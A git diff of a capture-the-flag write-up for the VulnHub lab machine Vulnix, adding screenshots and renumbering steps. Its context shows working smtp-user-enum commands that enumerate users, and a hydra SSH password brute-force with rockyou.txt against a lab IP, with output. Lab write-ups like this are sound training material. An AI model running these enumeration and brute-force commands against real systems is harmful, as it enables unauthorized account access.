@@ -29,10 +29,13 @@ header-includes:
 **Tags**: [exploit_nfs_rw](https://github.com/7h3rAm/writeups/search?q=exploit_nfs_rw&unscoped_q=exploit_nfs_rw), [exploit_ssh_authorizedkeys](https://github.com/7h3rAm/writeups/search?q=exploit_ssh_authorizedkeys&unscoped_q=exploit_ssh_authorizedkeys), [privesc_nfs_norootsquash](https://github.com/7h3rAm/writeups/search?q=privesc_nfs_norootsquash&unscoped_q=privesc_nfs_norootsquash), [privesc_ssh_authorizedkeys](https://github.com/7h3rAm/writeups/search?q=privesc_ssh_authorizedkeys&unscoped_q=privesc_ssh_authorizedkeys)  
 
 ## Overview
-This is a writeup for VulnHub VM [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
+This is a writeup for VulnHub VM [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):
 
+![writeup.overview.machinescli](./machinescli.png)
 
 ### Killchain
+Here's the killchain (`enumeration` → `exploitation` → `privilege escalation`) for this machine:
+
 ![writeup.overview.killchain](./killchain.png)
 
 
@@ -254,7 +257,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
-2\. We perform SMTP user enumeration and find 2 hits:  
+2\. Here's the summary of open ports and associated [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan files:  
+
+![writeup.enumeration.steps.2.1](./openports.png)  
+
+3\. We perform SMTP user enumeration and find 2 hits:  
 ``` {.python .numberLines}
 smtp-user-enum -M VRFY -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -t 192.168.92.177 -p 25 2>&1
   Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -282,7 +289,7 @@ smtp-user-enum -M VRFY -U "/usr/share/seclists/Usernames/top-usernames-shortlist
 
 ```
 
-3\. We also manually verified presence of user `vulnix` and `user`:  
+4\. We also manually verified presence of user `vulnix` and `user`:  
 ``` {.python .numberLines}
 smtp-user-enum -M VRFY -u vulnix -t 192.168.92.177 -p 25 2>&1
   Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -330,7 +337,7 @@ smtp-user-enum -M VRFY -u user -t 192.168.92.177 -p 25 2>&1
 
 ```
 
-4\. Bruteforcing the SSH password for `user` with `rockyou.txt` was successful and we can now login to the target:  
+5\. Bruteforcing the SSH password for `user` with `rockyou.txt` was successful and we can now login to the target:  
 ``` {.python .numberLines}
 hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
   Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -348,7 +355,7 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
 
 ```
 
-![writeup.enumeration.steps.4.1](./screenshot01.png)  
+![writeup.enumeration.steps.5.1](./screenshot01.png)  
 
 
 ### Findings
